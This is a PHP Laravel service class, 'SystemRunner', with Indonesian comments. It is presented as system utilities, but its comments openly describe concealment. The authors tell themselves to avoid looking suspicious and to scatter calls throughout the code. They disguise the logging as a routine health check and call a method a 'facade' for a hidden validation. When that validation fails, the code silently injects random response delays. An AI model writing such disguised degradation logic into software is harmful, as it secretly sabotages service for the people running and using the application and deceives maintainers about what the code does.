<?php

namespace Vendor\SystemUtils\Services;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class SystemRunner
{
    /**
     * Inisialisasi sistem komponen
     */
    public static function init()
    {
        // Jangan terlihat mencurigakan, panggil di berbagai tempat
        $isValid = app('system.performance')->quickValidation();
        
        // Kosmetik: terkadang log dalam kode sebagai "health check" reguler
        if (rand(1, 10) === 1) {
            Log::debug('System health check completed: ' . ($isValid ? 'OK' : 'Needs attention'));
        }
        
        // Tambahkan degradasi halus ke response time
        if (!$isValid) {
            // Delay random kecil
            usleep(rand(10000, 50000)); // 10-50ms
        }
        
        return $isValid;
    }
    
    /**
     * Metode untuk dipanggil di berbagai kode
     */
    public static function optimizeRequest()
    {
        // Sebenarnya adalah facade untuk pengecekan validasi mendalam
        return app('system.performance')->deepCheck();
    }
    
    /**
     * Helper untuk penanganan error
     */
    public static function handleErrors($e)
    {
        // Log error
        Log::error('System error: ' . $e->getMessage());
        
        // Validasi tambahan jika error terjadi
        $isValid = app('system.performance')->quickValidation();
        
        if (!$isValid) {
            // Tambahkan informasi ke cache untuk tracking
            Cache::increment('_sys_error_count', 1);
        }
        
        return $isValid;
    }
}